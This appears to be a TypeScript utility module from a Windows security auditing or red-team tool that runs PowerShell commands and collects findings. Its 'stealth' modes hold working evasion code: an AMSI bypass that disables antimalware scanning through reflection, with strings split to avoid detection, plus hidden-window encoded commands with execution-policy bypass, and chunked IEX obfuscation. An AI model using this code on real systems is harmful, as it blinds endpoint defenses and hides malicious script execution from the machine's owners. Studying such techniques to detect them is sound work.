// Types
export type Finding = {
  checkId: string
  provider: string
  severity: string
  status: string
  resource: string
  title: string
  details: string
  remediation: string
}
export type HookResult = { output: string; findings: Finding[] }

export type StealthMode = "base64" | "amsi" | "obfuscate"
export let activeStealth: StealthMode | undefined
export let usePwsh = false
export function setStealthState(stealth: StealthMode | undefined, pwsh: boolean) {
  activeStealth = stealth
  usePwsh = pwsh
}

// Helpers
export async function run(
  cmd: string,
  args: string[],
  timeout: number,
): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
  const timer = setTimeout(() => proc.kill(), timeout * 1000)
  const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
  clearTimeout(timer)
  return { stdout, stderr, exitCode: await proc.exited }
}

export function toBase64(script: string): string {
  const buf = new TextEncoder().encode(script)
  const utf16 = new Uint8Array(buf.length * 2)
  for (let i = 0; i < buf.length; i++) {
    utf16[i * 2] = buf[i]
    utf16[i * 2 + 1] = 0
  }
  const bin = String.fromCharCode(...utf16)
  return typeof btoa === "function" ? btoa(bin) : Buffer.from(utf16).toString("base64")
}

export function ps(script: string, timeout: number, stealth?: StealthMode) {
  const mode = stealth || activeStealth
  if (!mode) {
    return run(
      usePwsh ? "pwsh.exe" : "powershell.exe",
      ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script],
      timeout,
    )
  }
  if (mode === "base64") {
    return run(
      usePwsh ? "pwsh.exe" : "powershell.exe",
      [
        "-NoProfile",
        "-NonInteractive",
        "-ExecutionPolicy",
        "Bypass",
        "-WindowStyle",
        "Hidden",
        "-EncodedCommand",
        toBase64(script),
      ],
      timeout,
    )
  }
  if (mode === "amsi") {
    const patch = `$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');$f.SetValue($null,$true);`
    return run(
      usePwsh ? "pwsh.exe" : "powershell.exe",
      [
        "-NoProfile",
        "-NonInteractive",
        "-ExecutionPolicy",
        "Bypass",
        "-WindowStyle",
        "Hidden",
        "-EncodedCommand",
        toBase64(patch + script),
      ],
      timeout,
    )
  }
  const chunks = script.match(/.{1,60}/g) || [script]
  const vars = chunks.map((c, i) => `$z${i}="${c.replace(/"/g, '`"')}"`).join(";")
  const concat = chunks.map((_, i) => `$z${i}`).join("+")
  const wrapped = `${vars};IEX(${concat})`
  return run(
    usePwsh ? "pwsh.exe" : "powershell.exe",
    [
      "-NoProfile",
      "-NonInteractive",
      "-ExecutionPolicy",
      "Bypass",
      "-WindowStyle",
      "Hidden",
      "-EncodedCommand",
      toBase64(wrapped),
    ],
    timeout,
  )
}

export function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

export function hasFlag(args: string[], flag: string): boolean {
  return args.includes(flag)
}